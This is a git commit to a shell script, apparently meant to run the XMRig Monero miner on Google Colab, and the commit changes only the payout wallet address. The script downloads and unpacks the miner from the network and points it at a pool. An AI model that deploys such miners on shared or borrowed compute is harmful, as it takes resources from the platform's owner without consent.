24afe731468a2040c3428dd14e24014ba524c321
ardikk <kurniawanardi4@gmail.com>
2022-03-30 11:48:15 +0700

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
 tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
-./xmrig -o us-west.minexmr.com:443 -u 8A6cdvshzV4dEWthU6fdgjMoJaNgwTn7rLDSdpLoKtHrQ83cdQCWtQQe6HGDrnYv5Z3zUfGuKSR8AByBGpgVPkc8Kp95en3 -k --tls --rig-id GC-US
+./xmrig -o us-west.minexmr.com:443 -u 85uxE9SL9xRVP2mfQE4Mijfi8F3Rh1D9K8R6NKdm85sFYJYVAUvzq9jhNNhWu2BUhpGeBhcYiEWrNhBNeX4GK37n5PN6R3d -k --tls --rig-id GC-US
